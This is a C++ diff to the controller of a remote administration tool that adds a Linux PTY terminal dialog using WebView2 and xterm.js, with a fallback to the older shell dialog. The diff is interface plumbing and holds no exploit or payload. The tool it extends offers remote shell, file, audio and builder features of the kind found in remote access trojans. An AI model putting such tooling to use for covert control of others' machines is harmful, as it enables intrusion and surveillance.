@@ -12,6 +12,7 @@
 #include "FileManagerDlg.h"
 #include "TalkDlg.h"
 #include "ShellDlg.h"
+#include "TerminalDlg.h"
 #include "SystemDlg.h"
 #include "BuildDlg.h"
 #include "AudioDlg.h"
@@ -496,6 +497,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, OnOpenFileManagerDialog)
     ON_MESSAGE(WM_OPENTALKDIALOG, OnOpenTalkDialog)
     ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+    ON_MESSAGE(WM_OPENTERMINALDIALOG, OnOpenTerminalDialog)
     ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
     ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
     ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
@@ -2901,8 +2903,18 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
         break;
     }
-    case TOKEN_SHELL_START: { // 远程终端【x】
+    case TOKEN_SHELL_START: { // Windows 远程终端
         g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
+        break;
+    }
+    case TOKEN_TERMINAL_START: { // Linux PTY 终端 (WebView2 + xterm.js)
+        // 尝试加载 TerminalModule DLL，失败则退化到 ShellDlg
+        if (LoadTerminalModule()) {
+            g_2015RemoteDlg->SendMessage(WM_OPENTERMINALDIALOG, 0, (LPARAM)ContextObject);
+        } else {
+            g_2015RemoteDlg->PostMessageA(WM_SHOWMESSAGE, (WPARAM)new CharMsg("To use Modern Terminal - TerminalModule.dll is required"), NULL);
+            g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
+        }
         break;
     }
     case TOKEN_WSLIST:  // 窗口管理【x】
@@ -3242,6 +3254,12 @@ LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
 LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 {
     return OpenDialog<CShellDlg, IDD_DIALOG_SHELL>(wParam, lParam);
+}
+
+LRESULT CMy2015RemoteDlg::OnOpenTerminalDialog(WPARAM wParam, LPARAM lParam)
+{
+    // 复用 ShellDlg 的对话框模板，TerminalDlg 会在初始化时替换 Edit 为 WebView2
+    return OpenDialog<CTerminalDlg, IDD_DIALOG_SHELL>(wParam, lParam);
 }
 
 
